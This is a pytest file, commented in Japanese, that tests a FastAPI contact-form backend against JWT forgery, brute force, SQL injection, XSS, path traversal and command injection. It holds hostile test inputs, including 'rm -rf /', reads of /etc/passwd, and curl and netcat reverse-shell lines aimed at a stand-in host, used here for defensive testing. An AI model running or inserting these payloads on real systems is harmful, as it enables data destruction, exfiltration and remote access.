"""
セキュリティ統合テスト

Task 8.2: 統合テスト・E2Eテスト実装
セキュリティ脆弱性、認証・認可、入力検証の統合テスト
"""

import pytest
import jwt
import time
import hashlib
import base64
from datetime import datetime, timedelta
from unittest.mock import Mock, patch, MagicMock
from fastapi.testclient import TestClient
from sqlalchemy.sql import text

# テスト対象インポート
from backend.app.main import create_main_app
from backend.app.config.security import SecurityConfig
from backend.app.services.auth_service import AuthService


class TestAuthenticationSecurity:
    """認証セキュリティテスト"""
    
    @pytest.fixture
    def test_app(self):
        """テストアプリケーション"""
        app = create_main_app()
        return app
    
    @pytest.fixture
    def security_config(self):
        """セキュリティ設定"""
        return SecurityConfig(
            jwt_secret="test_jwt_secret_key_for_security_testing",
            jwt_algorithm="HS256",
            jwt_expires_minutes=30,
            password_min_length=8,
            max_login_attempts=5,
            lockout_duration_minutes=15
        )
    
    def test_jwt_token_validation(self, test_app, security_config):
        """JWTトークン検証テスト"""
        client = TestClient(test_app)
        
        # 1. 有効なトークンでのアクセス
        valid_payload = {
            "user_id": "admin_123",
            "email": "admin@example.com",
            "role": "admin",
            "exp": datetime.utcnow() + timedelta(minutes=30),
            "iat": datetime.utcnow()
        }
        
        valid_token = jwt.encode(
            valid_payload,
            security_config.jwt_secret,
            algorithm=security_config.jwt_algorithm
        )
        
        headers = {"Authorization": f"Bearer {valid_token}"}
        response = client.get("/api/v1/admin/dashboard", headers=headers)
        # 実装次第で200または適切なステータスコード
        
        # 2. 期限切れトークン
        expired_payload = {
            "user_id": "admin_123", 
            "email": "admin@example.com",
            "role": "admin",
            "exp": datetime.utcnow() - timedelta(minutes=30),  # 30分前
            "iat": datetime.utcnow() - timedelta(hours=1)
        }
        
        expired_token = jwt.encode(
            expired_payload,
            security_config.jwt_secret,
            algorithm=security_config.jwt_algorithm
        )
        
        headers = {"Authorization": f"Bearer {expired_token}"}
        response = client.get("/api/v1/admin/dashboard", headers=headers)
        assert response.status_code == 401
        
        error_detail = response.json()
        assert "expired" in error_detail["detail"].lower()
        
        # 3. 無効な署名
        invalid_token = jwt.encode(
            valid_payload,
            "wrong_secret_key",
            algorithm=security_config.jwt_algorithm
        )
        
        headers = {"Authorization": f"Bearer {invalid_token}"}
        response = client.get("/api/v1/admin/dashboard", headers=headers)
        assert response.status_code == 401
        
        # 4. 改ざんされたトークン
        tampered_token = valid_token[:-10] + "tampered123"
        headers = {"Authorization": f"Bearer {tampered_token}"}
        response = client.get("/api/v1/admin/dashboard", headers=headers)
        assert response.status_code == 401
    
    def test_brute_force_protection(self, test_app):
        """ブルートフォース攻撃保護テスト"""
        client = TestClient(test_app)
        
        # 同一IPアドレスからの大量ログイン試行
        login_data = {
            "email": "admin@example.com",
            "password": "wrong_password"
        }
        
        # 最初の5回の失敗（許可範囲内）
        for i in range(5):
            response = client.post("/api/v1/auth/login", json=login_data)
            assert response.status_code == 401
            
            error_detail = response.json()
            assert "invalid credentials" in error_detail["detail"].lower()
        
        # 6回目の試行でレート制限発動
        response = client.post("/api/v1/auth/login", json=login_data)
        assert response.status_code == 429
        
        error_detail = response.json()
        assert "rate limit" in error_detail["detail"].lower() or "too many attempts" in error_detail["detail"].lower()
        
        # 正しいパスワードでも一定時間ロックアウト
        correct_login = {
            "email": "admin@example.com",
            "password": "correct_password"
        }
        
        response = client.post("/api/v1/auth/login", json=correct_login)
        assert response.status_code == 429  # まだロックアウト中
    
    def test_session_security(self, test_app):
        """セッションセキュリティテスト"""
        client = TestClient(test_app)
        
        # 1. セッション固定攻撃対策
        # ログイン前のセッションID取得
        response = client.get("/api/v1/auth/csrf-token")
        pre_login_cookies = response.cookies
        
        # ログイン実行
        login_response = client.post(
            "/api/v1/auth/login",
            json={"email": "admin@example.com", "password": "test_password"}
        )
        
        if login_response.status_code == 200:
            # ログイン後のセッションIDが変更されることを確認
            post_login_cookies = login_response.cookies
            # セッションIDの変更確認（実装依存）
            
            # 2. セッション並行利用制限
            token = login_response.json().get("access_token")
            
            # 同一アカウントで別の場所からログイン
            second_login = client.post(
                "/api/v1/auth/login", 
                json={"email": "admin@example.com", "password": "test_password"}
            )
            
            if second_login.status_code == 200:
                second_token = second_login.json().get("access_token")
                
                # 最初のトークンが無効化されることを確認
                headers = {"Authorization": f"Bearer {token}"}
                response = client.get("/api/v1/admin/profile", headers=headers)
                # セッション管理ポリシー次第で401になる可能性


class TestInputValidationSecurity:
    """入力検証セキュリティテスト"""
    
    @pytest.fixture
    def test_app(self):
        """テストアプリケーション"""
        return create_main_app()
    
    def test_sql_injection_protection(self, test_app):
        """SQLインジェクション保護テスト"""
        client = TestClient(test_app)
        
        # 1. お問い合わせフォームでのSQLインジェクション試行
        malicious_payloads = [
            "'; DROP TABLE contacts; --",
            "' OR 1=1 --",
            "'; UPDATE contacts SET email='hacker@evil.com' WHERE 1=1; --",
            "' UNION SELECT password FROM users --",
            "'; INSERT INTO contacts (name, email) VALUES ('hacker', 'evil@hack.com'); --"
        ]
        
        for payload in malicious_payloads:
            contact_data = {
                "name": payload,
                "email": f"test{hash(payload)}@example.com",  
                "subject": "SQLインジェクションテスト",
                "message": payload
            }
            
            response = client.post("/api/v1/contacts", json=contact_data)
            
            # SQLインジェクション攻撃が成功しないことを確認
            assert response.status_code in [400, 422]  # バリデーションエラー
            
            if response.status_code == 422:
                error_detail = response.json()
                assert "detail" in error_detail
    
    def test_xss_protection(self, test_app):
        """XSS攻撃保護テスト"""
        client = TestClient(test_app)
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<%2Fscript%2F><script>alert('XSS')</script>",
            "<svg/onload=alert('XSS')>",
            "<body onload=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            contact_data = {
                "name": f"テストユーザー{hash(payload)}",
                "email": f"test{abs(hash(payload))}@example.com",
                "subject": payload,
                "message": f"XSSテスト: {payload}"
            }
            
            response = client.post("/api/v1/contacts", json=contact_data)
            
            if response.status_code == 201:
                # お問い合わせが作成された場合、データが適切にサニタイズされることを確認
                contact_id = response.json()["id"]
                
                # 管理者としてお問い合わせ詳細取得
                headers = {"Authorization": "Bearer admin_test_token"}
                detail_response = client.get(f"/api/v1/admin/contacts/{contact_id}", headers=headers)
                
                if detail_response.status_code == 200:
                    detail_data = detail_response.json()
                    
                    # スクリプトタグが削除またはエスケープされていることを確認
                    assert "<script>" not in detail_data["subject"]
                    assert "javascript:" not in detail_data["message"]
                    assert "<img" not in detail_data["subject"]
                    assert "onerror" not in detail_data["message"]
    
    def test_path_traversal_protection(self, test_app):
        """パストラバーサル攻撃保護テスト"""
        client = TestClient(test_app)
        
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc//passwd",
            "../../../usr/local/app/.env"
        ]
        
        # ファイルアップロード機能での攻撃テスト（もしあれば）
        for payload in path_traversal_payloads:
            # お問い合わせ添付ファイル経由での攻撃
            files = {"attachment": (payload, "malicious content", "text/plain")}
            
            response = client.post(
                "/api/v1/contacts/upload",
                files=files,
                data={"contact_id": "test_contact_123"}
            )
            
            # パストラバーサル攻撃が防がれることを確認
            assert response.status_code in [400, 422, 403]
    
    def test_command_injection_protection(self, test_app):
        """コマンドインジェクション保護テスト"""
        client = TestClient(test_app)
        
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(cat /etc/passwd)",
            "; curl http://malicious.com/steal-data",
            "| nc malicious.com 8080 -e /bin/sh"
        ]
        
        for payload in command_injection_payloads:
            # 検索機能での攻撃試行
            response = client.get(f"/api/v1/search?q={payload}")
            
            # コマンドインジェクションが防がれることを確認
            assert response.status_code in [400, 422]
            
            # お問い合わせメッセージでの攻撃試行
            contact_data = {
                "name": "コマンドテスト",
                "email": "cmd@test.com",
                "subject": "コマンドインジェクションテスト", 
                "message": payload
            }
            
            response = client.post("/api/v1/contacts", json=contact_data)
            
            # 適切に処理されること（作成成功またはバリデーションエラー）
            assert response.status_code in [201, 400, 422]


class TestDataSecurityIntegration:
    """データセキュリティ統合テスト"""
    
    @pytest.fixture
    def test_app(self):
        """テストアプリケーション"""
        return create_main_app()
    
    def test_sensitive_data_masking(self, test_app):
        """機密データマスキングテスト"""
        client = TestClient(test_app)
        
        # 機密情報を含むお問い合わせ作成
        sensitive_contact = {
            "name": "機密テストユーザー",
            "email": "sensitive@example.com",
            "subject": "クレジットカード情報問い合わせ",
            "message": "クレジットカード番号: 4111-1111-1111-1111\n"
                      "CVV: 123\n"
                      "電話番号: 090-1234-5678\n"
                      "マイナンバー: 123456789012"
        }
        
        response = client.post("/api/v1/contacts", json=sensitive_contact)
        assert response.status_code == 201
        
        contact_id = response.json()["id"]
        
        # 一般ユーザーがお問い合わせを確認した場合
        response = client.get(f"/api/v1/contacts/{contact_id}")
        
        if response.status_code == 200:
            contact_data = response.json()
            
            # クレジットカード番号がマスクされていることを確認
            assert "4111-1111-1111-1111" not in contact_data["message"]
            assert "****" in contact_data["message"] or "XXXX" in contact_data["message"]
            
            # CVVがマスクされていることを確認
            assert "123" not in contact_data["message"] or contact_data["message"].count("123") == 0
            
        # 管理者がお問い合わせを確認した場合（一部マスキング）
        admin_headers = {"Authorization": "Bearer admin_test_token"}
        admin_response = client.get(f"/api/v1/admin/contacts/{contact_id}", headers=admin_headers)
        
        if admin_response.status_code == 200:
            admin_data = admin_response.json()
            
            # 管理者には一部の情報は見えるが、完全な機密情報は見えない設計
            assert "4111" in admin_data["message"]  # カード番号の最初の部分
            assert "1111" not in admin_data["message"]  # カード番号の最後の部分はマスク
    
    def test_data_encryption_integrity(self, test_app):
        """データ暗号化整合性テスト"""
        client = TestClient(test_app)
        
        # 暗号化対象データを含むお問い合わせ作成
        encrypted_contact = {
            "name": "暗号化テストユーザー",
            "email": "encryption@example.com",
            "subject": "機密情報問い合わせ",
            "message": "重要な機密情報が含まれています。\n"
                      "パスワード: MySecretPassword123!\n"
                      "API Key: sk-1234567890abcdef"
        }
        
        response = client.post("/api/v1/contacts", json=encrypted_contact)
        assert response.status_code == 201
        
        contact_id = response.json()["id"]
        
        # データベースレベルでの暗号化確認（モック）
        with patch('backend.app.models.contact.Contact.get_encrypted_fields') as mock_encrypted:
            mock_encrypted.return_value = {
                "message": "encrypted_message_content_hash",
                "internal_notes": "encrypted_notes_content_hash"
            }
            
            # 暗号化されたデータが平文でDBに保存されていないことを確認
            # 実際のテストではDBに直接アクセスして確認
            pass
    
    def test_audit_logging_integration(self, test_app):
        """監査ログ統合テスト"""
        client = TestClient(test_app)
        
        # 監査対象操作の実行
        audit_operations = [
            # お問い合わせ作成
            {
                "method": "POST",
                "url": "/api/v1/contacts",
                "data": {
                    "name": "監査テストユーザー",
                    "email": "audit@example.com", 
                    "subject": "監査ログテスト",
                    "message": "監査ログ記録テストです"
                }
            },
            # 管理者ログイン
            {
                "method": "POST",
                "url": "/api/v1/auth/login",
                "data": {
                    "email": "admin@example.com",
                    "password": "test_password"
                }
            },
            # お問い合わせ状況変更
            {
                "method": "PUT",
                "url": "/api/v1/admin/contacts/test_contact_123/status",
                "data": {"status": "resolved"},
                "headers": {"Authorization": "Bearer admin_test_token"}
            }
        ]
        
        with patch('backend.app.services.audit_service.AuditService.log_event') as mock_audit:
            for operation in audit_operations:
                if operation["method"] == "POST":
                    response = client.post(
                        operation["url"],
                        json=operation["data"],
                        headers=operation.get("headers", {})
                    )
                elif operation["method"] == "PUT":
                    response = client.put(
                        operation["url"],
                        json=operation["data"],
                        headers=operation.get("headers", {})
                    )
                elif operation["method"] == "GET":
                    response = client.get(
                        operation["url"],
                        headers=operation.get("headers", {})
                    )
                
                # 監査ログが記録されることを確認
                mock_audit.assert_called()
                
                # 監査ログ内容の検証
                call_args = mock_audit.call_args
                log_event = call_args[0][0] if call_args[0] else call_args[1]
                
                assert "event_type" in log_event
                assert "user_id" in log_event or "ip_address" in log_event
                assert "timestamp" in log_event
                assert "details" in log_event


class TestAPISecurityHeaders:
    """APIセキュリティヘッダーテスト"""
    
    @pytest.fixture
    def test_app(self):
        """テストアプリケーション"""
        return create_main_app()
    
    def test_security_headers_presence(self, test_app):
        """セキュリティヘッダー存在確認テスト"""
        client = TestClient(test_app)
        
        response = client.get("/api/v1/health")
        
        # 必須セキュリティヘッダーの確認
        security_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "default-src 'self'",
            "Referrer-Policy": "strict-origin-when-cross-origin"
        }
        
        for header_name, expected_value in security_headers.items():
            assert header_name in response.headers, f"セキュリティヘッダー {header_name} が見つかりません"
            
            # 一部のヘッダーは値も確認
            if header_name in ["X-Content-Type-Options", "X-Frame-Options"]:
                assert response.headers[header_name] == expected_value
    
    def test_cors_configuration(self, test_app):
        """CORS設定テスト"""
        client = TestClient(test_app)
        
        # プリフライトリクエスト
        response = client.options(
            "/api/v1/contacts",
            headers={
                "Origin": "https://trusted-domain.com",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type,Authorization"
            }
        )
        
        # CORS ヘッダーの確認
        assert "Access-Control-Allow-Origin" in response.headers
        assert "Access-Control-Allow-Methods" in response.headers
        assert "Access-Control-Allow-Headers" in response.headers
        
        # 不正なOriginの拒否確認
        malicious_origin_response = client.options(
            "/api/v1/contacts",
            headers={
                "Origin": "https://malicious-domain.com",
                "Access-Control-Request-Method": "POST"
            }
        )
        
        # 不正なOriginの場合はCORSヘッダーが設定されない
        assert response.headers.get("Access-Control-Allow-Origin") != "https://malicious-domain.com"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])